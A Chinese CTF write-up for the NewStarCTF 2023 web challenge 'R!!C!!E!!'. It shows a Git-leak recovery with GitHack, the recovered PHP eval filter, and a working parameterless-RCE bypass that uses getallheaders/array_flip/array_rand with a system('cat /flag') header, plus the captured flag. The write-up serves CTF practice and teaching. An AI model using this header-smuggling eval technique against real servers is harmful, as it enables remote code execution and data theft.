---
title: NewStarCTF 2023 R!!C!!E!!
date: 2023-10-24
categories:
  - CTF
  - Web
---

## 前置工作

进入靶机网页，只有一句话

```
Welcome To NewstarCTF 2023,Nothing here,or you wanna to find some leaked information?
```

看 F12 也没有什么泄露的内容，那么就有可能是 Git 泄露，可以使用 GitHack 获得靶机网页 `.git` 目录下的内容

```
python GitHack.py http://91df782c-9931-4bf4-bf3f-1cb2907c7750.node4.buuoj.cn:81/.git
```

得到关键文件 `bo0g1pop.php`（在输入上面的命令之前，强烈建议关闭火绒，否则直接被杀了）

```php
<?php
highlight_file(__FILE__);
if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {
    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){
        eval($_GET['star']);
    }
}
```

## 代码审计

先看第一个 if

```
preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])
```

看不太懂，问问 ChatGPT

大意是匹配这样的字符串：`functionName(argument1, argument2, ...)`，然后 `replace()` 函数会把里面的参数全去掉，换句话说，这次的 RCE 是无参数的（比如使用 `echo("Hello")`，里面的 `"Hello"` 就会被去掉）

再来看第二个 if

```
!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])
```

这里甚至禁用掉了你能想到的扫盘方法

但我们可以换一个思路，既然不能有参数，还不能用以上的命令，那么我们可以尝试从别的地方读取参数

## 构思攻入方法

有一个函数 `getallheaders()` 恰好满足我的需求，比如我可以写一个 `hack: system("cat /flag")`，把他加入到 headers 里，后续将这个 `hack` 的值作为命令

但是 `getallheaders()` 取得的是数组，换句话说，我需要不依赖任何参数取得其中的值才行

但是这道题受限于无参数的 RCE，我们还需要再换一个思路

有一个函数叫 `array_rand()`，这个是随机取得一个数组中的键，注意是键，不是值，这就很容易让人联想到另一个函数了 `array_flip()`，这个函数的作用是使得数组内的键值调换，原来的值变成键，原来的键变成值

那我们就可以这么写 `star` 参数了

```
?star=eval(array_rand(array_flip(getallheaders())));
```

然后我们在 headers 中再写一个 `hack: system("cat /flag");`，准备碰运气

## 获取 Flag

最好使用 HackBar 完成这次的所有操作，因为 `array_rand()`，是随机的，我们只需要在 HackBar 上多按几次 EXECUTE 即可

![](https://z1.ax1x.com/2023/10/13/pipi5tS.png)

最后附上 Http 请求代码

```http
GET /bo0g1pop.php/?star=eval(array_rand(array_flip(getallheaders()))); HTTP/1.1
Hack: system("cat /flag");
```

得到 Flag 为 `flag{9bbd1239-1a20-43b3-9d2c-0c893ad1716f}`